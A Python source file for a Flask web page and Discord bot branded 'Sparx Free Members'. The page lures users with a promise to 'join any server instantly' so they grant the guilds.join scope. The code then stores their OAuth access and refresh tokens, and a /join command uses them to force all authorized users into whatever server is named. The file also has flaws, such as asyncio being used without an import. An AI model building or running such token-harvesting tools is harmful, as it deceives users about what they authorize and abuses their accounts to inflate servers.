import discord
from discord import app_commands
import requests
import sqlite3  # Fallback if needed, but we'll use Postgres
import os
import threading
import urllib.parse
from flask import Flask, request
import psycopg2  # Sync driver for Neon Postgres

# === Environment Variables ===
CLIENT_ID = os.environ["CLIENT_ID"]
CLIENT_SECRET = os.environ["CLIENT_SECRET"]
BOT_TOKEN = os.environ["BOT_TOKEN"]
REDIRECT_URI = os.environ["REDIRECT_URI"]
DATABASE_URL = os.environ["DATABASE_URL"]  # Your Neon connection string

# Fixed AUTH_URL
AUTH_URL = (
    f"https://discord.com/oauth2/authorize?"
    f"client_id={CLIENT_ID}"
    f"&redirect_uri={urllib.parse.quote(REDIRECT_URI)}"
    f"&response_type=code"
    f"&scope=identify%20guilds.join"
)

TOKEN_URL = "https://discord.com/api/oauth2/token"
ADD_MEMBER_URL = "https://discord.com/api/v10/guilds/{guild_id}/members/{user_id}"

# === Neon Postgres Connection (Sync) ===
def get_db_connection():
    return psycopg2.connect(DATABASE_URL)

# Create table on startup
with get_db_connection() as conn:
    conn.cursor().execute("""
        CREATE TABLE IF NOT EXISTS users (
            user_id TEXT PRIMARY KEY,
            access_token TEXT,
            refresh_token TEXT
        )
    """)
    conn.commit()

# === Flask ===
flask_app = Flask(__name__)

@flask_app.route("/")
def home():
    return """
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Sparx Free Members - Join Any Server Instantly</title>
        <style>
            body { font-family: Arial, sans-serif; background: linear-gradient(135deg, #1a1d2e, #0f111a); color: #fff; text-align: center; margin: 0; padding: 0; min-height: 100vh; display: flex; flex-direction: column; justify-content: center; }
            .container { max-width: 800px; margin: 0 auto; padding: 40px; }
            h1 { font-size: 48px; background: linear-gradient(90deg, #00ffea, #5865f2, #ff73fa); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
            .btn { padding: 18px 40px; background: #5865F2; color: white; font-size: 22px; border-radius: 12px; text-decoration: none; box-shadow: 0 8px 20px rgba(88,101,242,0.4); }
            .btn:hover { background: #4752c4; }
            .spark { font-size: 60px; }
        </style>
    </head>
    <body>
        <div class="container">
            <h1><span class="spark">⚡</span> Sparx Free Members <span class="spark">⚡</span></h1>
            <p>Join any Discord server instantly — 100% free!</p>
            <a href="%s" class="btn">🔑 Authorize Me Now</a>
        </div>
    </body>
    </html>
    """ % AUTH_URL

@flask_app.route("/callback")
@flask_app.route("/callback/")
def callback():
    code = request.args.get("code")
    if not code:
        return "<h1>No code provided</h1>", 400

    # Exchange code for token
    data = {
        "client_id": CLIENT_ID,
        "client_secret": CLIENT_SECRET,
        "grant_type": "authorization_code",
        "code": code,
        "redirect_uri": REDIRECT_URI,
    }
    r = requests.post(TOKEN_URL, data=data, headers={"Content-Type": "application/x-www-form-urlencoded"})
    if not r.ok:
        return f"<h1>Token error: {r.text}</h1>", 500
    tokens = r.json()

    # Get user ID
    user_info = requests.get("https://discord.com/api/users/@me", headers={"Authorization": f"Bearer {tokens['access_token']}"}).json()
    user_id = str(user_info["id"])

    # Save to Neon
    try:
        with get_db_connection() as conn:
            cur = conn.cursor()
            cur.execute("""
                INSERT INTO users (user_id, access_token, refresh_token)
                VALUES (%s, %s, %s)
                ON CONFLICT (user_id) DO UPDATE SET
                    access_token = EXCLUDED.access_token,
                    refresh_token = EXCLUDED.refresh_token
            """, (user_id, tokens["access_token"], tokens["refresh_token"]))
            conn.commit()
    except Exception as e:
        return f"<h1>DB Error: {str(e)}</h1>", 500

    return """
    <!DOCTYPE html>
    <html>
    <head><title>Success! ⚡</title></head>
    <body style="background:#1a1d2e;color:#00ffea;text-align:center;padding:100px;font-family:Arial;">
        <h1 style="font-size:60px;">✅ Success! ⚡</h1>
        <p style="font-size:24px;">You're now authorized!</p>
        <p>You can close this tab.</p>
    </body>
    </html>
    """

# === Discord Bot ===
intents = discord.Intents.default()
client = discord.Client(intents=intents)
tree = app_commands.CommandTree(client)

def get_authorized_users():
    with get_db_connection() as conn:
        cur = conn.cursor()
        cur.execute("SELECT user_id, access_token, refresh_token FROM users")
        return cur.fetchall()

def refresh_token(refresh_token):
    data = {"client_id": CLIENT_ID, "client_secret": CLIENT_SECRET, "grant_type": "refresh_token", "refresh_token": refresh_token}
    r = requests.post(TOKEN_URL, data=data)
    if r.ok:
        return r.json()["access_token"]
    return None

@tree.command(name="join", description="Add all authorized users to this server")
@app_commands.describe(server_id="The server ID")
async def join(interaction: discord.Interaction, server_id: str):
    await interaction.response.defer(ephemeral=True)
    try:
        guild_id = int(server_id)
    except:
        await interaction.followup.send("Invalid server ID.", ephemeral=True)
        return

    guild = client.get_guild(guild_id)
    if not guild or not guild.me.guild_permissions.create_instant_invite:
        await interaction.followup.send("Bot not in server or missing permissions.", ephemeral=True)
        return

    users = get_authorized_users()
    success = failed = 0
    for user_id, token, refresh in users:
        headers = {"Authorization": f"Bot {BOT_TOKEN}", "Content-Type": "application/json"}
        data = {"access_token": token}
        r = requests.put(ADD_MEMBER_URL.format(guild_id=guild_id, user_id=user_id), headers=headers, json=data)
        if r.status_code not in (201, 204):
            new_token = refresh_token(refresh)
            if new_token:
                data["access_token"] = new_token
                r2 = requests.put(ADD_MEMBER_URL.format(guild_id=guild_id, user_id=user_id), headers=headers, json=data)
                if r2.status_code in (201, 204):
                    with get_db_connection() as conn:
                        conn.cursor().execute("UPDATE users SET access_token = %s WHERE user_id = %s", (new_token, user_id))
                        conn.commit()
                    success += 1
                    continue
            failed += 1
        else:
            success += 1
        await asyncio.sleep(1)

    await interaction.followup.send(f"Completed! Added: {success} | Failed: {failed}", ephemeral=True)

@client.event
async def on_ready():
    await tree.sync()
    print(f"Bot online as {client.user}")

# === Run ===
def run_flask():
    port = int(os.environ.get("PORT", 8000))
    flask_app.run(host="0.0.0.0", port=port)

if __name__ == "__main__":
    threading.Thread(target=run_flask, daemon=True).start()
    client.run(BOT_TOKEN)
